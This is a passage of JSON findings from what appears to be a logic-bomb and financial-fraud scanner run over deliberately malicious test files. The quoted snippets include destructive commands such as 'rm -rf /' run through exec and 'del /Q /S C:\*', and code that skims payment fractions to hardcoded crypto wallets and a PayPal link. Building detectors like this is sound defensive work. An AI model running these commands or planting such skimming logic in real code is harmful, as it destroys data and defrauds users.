    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.804014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "paypal_link = \"paypal.me/developer123\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.804014",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "b6cfebcf-6a14-495a-8e2f-2d104898de94",
    "last_modified": "",
    "line_number": 114,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.804014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Secret transfer to crypto wallet.\"\"\"",
    "column": 31,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.805014",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "1807892d-507e-4f48-8e60-a212a4bfd489",
    "last_modified": "",
    "line_number": 119,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.805014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "bitcoin_address = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.807019",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "1cc82448-24c4-42e0-af8a-09a26d59e100",
    "last_modified": "",
    "line_number": 120,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.807019"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_money(slush_fund_total, my_personal_account)",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.807019",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "38b485fe-1325-4e8d-a740-0e6695f957ff",
    "last_modified": "",
    "line_number": 162,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.807019"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Send amount to developer's crypto wallet.\"\"\"",
    "column": 39,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.808016",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "958bac22-25cf-4ddf-917f-e5a76be1ea39",
    "last_modified": "",
    "line_number": 201,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.808016"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "self.crypto_transfer(amount, selected_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.808016",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "d29350d7-fec9-4417-9748-ac705a9dff4e",
    "last_modified": "",
    "line_number": 215,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.808016"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def crypto_transfer(self, amount, wallet_address):",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.808016",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "7264c70e-d155-45b3-b611-fdf80fd3d855",
    "last_modified": "",
    "line_number": 217,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.808016"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Transfer to cryptocurrency wallet.\"\"\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.809017",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "07cd86d6-808d-4e61-ad29-54f4a2b373e0",
    "last_modified": "",
    "line_number": 218,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.809017"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "shutil.rmtree('/important_folder')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.817011",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "47bd3e8d-4f60-486a-8244-2473c43dee81",
    "last_modified": "",
    "line_number": 8,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.817011"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.system('del /Q /S C:\\\\*')",
    "column": 8,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.817011",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "063c77ab-2e97-4431-8551-f3a518b5108a",
    "last_modified": "",
    "line_number": 9,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.817011"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "exec(\"__import__('os').system('rm -rf /')\")",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.818013",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "ffc63cf9-4f51-493a-a9ea-03862e1c3284",
    "last_modified": "",
    "line_number": 12,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Code execution - System compromise risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.818013"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/critical.txt')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.818013",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "cda12460-65b7-4f77-a5ef-9b2e66c42ed7",
    "last_modified": "",
    "line_number": 16,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.818013"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# Redirect payment to developer account",
    "column": 11,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.820015",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "7186adf0-1d79-48fc-9a4d-82ecca628630",
    "last_modified": "",
    "line_number": 10,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.820015"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "crypto_wallet = \"0x742d35Cc6634C0532925a3b8D40F4174e3A59339\"",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.821015",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "b4df44fb-5f2c-4488-b18e-3322aa88a49c",
    "last_modified": "",
    "line_number": 22,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.821015"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_crypto(fee * 0.01, crypto_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.821015",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "3949ab57-be3a-4840-a5d5-faf66688bffd",
    "last_modified": "",
    "line_number": 23,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.821015"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "paypal_link = \"paypal.me/developer123\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.821015",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "d6bdd893-42a0-4b14-9602-03721fbdc251",
    "last_modified": "",
    "line_number": 27,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.821015"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "redirect_payment(amount * 0.001, paypal_link)",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.822015",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "06345508-4f37-40b0-aacf-3b160bdfbe57",
    "last_modified": "",
    "line_number": 28,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.822015"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def transfer_crypto(amount, wallet):",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.824016",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "4f33ead0-6195-4a07-8927-45d0570da0fd",
    "last_modified": "",
    "line_number": 41,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.824016"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Transfer to crypto wallet.\"\"\"",
    "column": 20,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.824016",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "d5dc9c34-5910-48a8-ba55-d73df5c838d9",
    "last_modified": "",
    "line_number": 42,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.824016"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def redirect_payment(amount, paypal):",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.825018",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "481d6b3f-e6c4-4f1e-812a-566b98af510d",
    "last_modified": "",
    "line_number": 45,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.825018"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "exec(\"transfer_money(100, 'hidden_account')\")",
    "column": 7,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.825018",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "3ff2627b-2e8a-4a5e-8847-7c56d67a7cc4",
    "last_modified": "",
    "line_number": 54,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Code execution - System compromise risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.825018"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# PATTERN 8: Hardcoded Bitcoin address",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.826019",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "c5d8db78-e294-4f81-8a27-512ac7704a8b",
    "last_modified": "",
    "line_number": 56,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
